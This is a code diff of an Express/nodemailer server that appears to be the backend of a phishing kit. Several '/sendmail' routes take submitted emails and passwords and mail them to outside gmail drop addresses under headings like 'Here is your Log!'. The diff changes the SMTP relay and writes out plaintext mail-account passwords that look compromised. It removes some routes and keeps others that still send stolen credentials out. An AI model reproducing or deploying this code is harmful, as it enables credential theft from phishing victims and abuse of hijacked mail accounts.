@@ -18,11 +18,11 @@ app.post("/sendmail", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "us2.smtp.mailhostbox.com",
-      port: 25,
+      host: "mail.lesportbg.com",
+      port: 465,
       auth: {
-        user: "dfsnainquiry@dovercorps.com",
-        pass: "QPNwYRn4",
+        user: "foreman@lesportbg.com",
+        pass: "lKNfe#L4DZ#9",
       },
     });
     let info = await transporter.sendMail({
@@ -48,89 +48,20 @@ app.post("/sendmail", async (req, res) => {
     res.status(500).send("Error sending email");
   }
 });
-app.post("/sendmail5", async (req, res) => {
-  const { email, pass, pasers } = req.body;
-  try {
-    let transporter = nodemailer.createTransport({
-      host: "us2.smtp.mailhostbox.com",
-      port: 25,
-      auth: {
-        user: "dfsnainquiry@dovercorps.com",
-        pass: "QPNwYRn4",
-      },
-    });
-    let info = await transporter.sendMail({
-      from: '"Happy time" <dfsnainquiry@dovercorps.com>',
-      to: "suemicheallaccuplas@gmail.com",
-      subject: "happy Time",
-      html: `
-    <div> 
-      <h2>Enjoy</h2>
-        <p>Email: ${email}</p>
-        <p>Pass: ${pass}</p>
-        <p>Confirm Pass: ${pasers}</p>
-    
-        <p>All the best, xxxmanlogs</p>
-         </div>
-    `,
-    });
-
-    await transporter.sendMail(info);
-    res.send("Email sent successfully");
-  } catch (error) {
-    console.error(error);
-    res.send("error");
-  }
-});
-
-app.post("/sendmail2", async (req, res) => {
-  const { email, pass, pasers } = req.body;
-  try {
-    let transporter = nodemailer.createTransport({
-      host: "us2.smtp.mailhostbox.com",
-      port: 25,
-      auth: {
-        user: "dfsnainquiry@dovercorps.com",
-        pass: "QPNwYRn4",
-      },
-    });
-    let info = await transporter.sendMail({
-      from: '"You" <dfsnainquiry@dovercorps.com>',
-      to: "sales1.ppsl@gmail.com",
-      subject: "xxxlogs",
-      html: `
-    <div> 
-      <h2>Here is your Log!</h2>
-        <p>Email: ${email}</p>
-        <p>Pass: ${pass}</p>
-        <p>Confirm Pass: ${pasers}</p>
-    
-        <p>All the best, xxxsonhack</p>
-         </div>
-    `,
-    });
-
-    await transporter.sendMail(info);
-    res.send("Email sent successfully");
-  } catch (error) {
-    console.error(error);
-    res.send("error");
-  }
-});
 
 app.post("/sendmail3", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "us2.smtp.mailhostbox.com",
-      port: 25,
+      host: "mail.lesportbg.com",
+      port: 465,
       auth: {
-        user: "dfsnainquiry@dovercorps.com",
-        pass: "QPNwYRn4",
+        user: "foreman@lesportbg.com",
+        pass: "lKNfe#L4DZ#9",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <dfsnainquiry@dovercorps.com>',
+      from: '"Happy time" <foreman@lesportbg.com>',
       to: "fredrick3smith33@gmail.com",
       subject: "Happy time",
       html: `
@@ -155,50 +86,16 @@ app.post("/sendmail4", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "us2.smtp.mailhostbox.com",
-      port: 25,
+      host: "mail.lesportbg.com",
+      port: 465,
       auth: {
-        user: "dfsnainquiry@dovercorps.com",
-        pass: "QPNwYRn4",
+        user: "foreman@lesportbg.com",
+        pass: "lKNfe#L4DZ#9",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <dfsnainquiry@dovercorps.com>',
+      from: '"Happy time" <foreman@lesportbg.com>',
       to: "fredrick3smith33@gmail.com",
-      subject: "Happy time",
-      html: `
-    <div> 
-      <h2>Here is your Log!</h2>
-        <p>Email: ${email}</p>
-        <p>Pass: ${pass}</p>
-        <p>Confirm Pass: ${pasers}</p>
-    
-        <p>All the best, XXXmannnXXX</p>
-         </div>
-    `,
-    });
-
-    await transporter.sendMail(info);
-    res.send("Email sent successfully");
-  } catch (error) {
-    console.error(error);
-    res.status(500).send("Error sending email");
-  }
-});
-app.post("/sendmail7", async (req, res) => {
-  const { email, pass, pasers } = req.body;
-  try {
-    let transporter = nodemailer.createTransport({
-      host: "us2.smtp.mailhostbox.com",
-      port: 25,
-      auth: {
-        user: "dfsnainquiry@dovercorps.com",
-        pass: "QPNwYRn4",
-      },
-    });
-    let info = await transporter.sendMail({
-      from: '"Happy time" <dfsnainquiry@dovercorps.com>',
-      to: "soccerroos23@gmail.com",
       subject: "Happy time",
       html: `
     <div> 
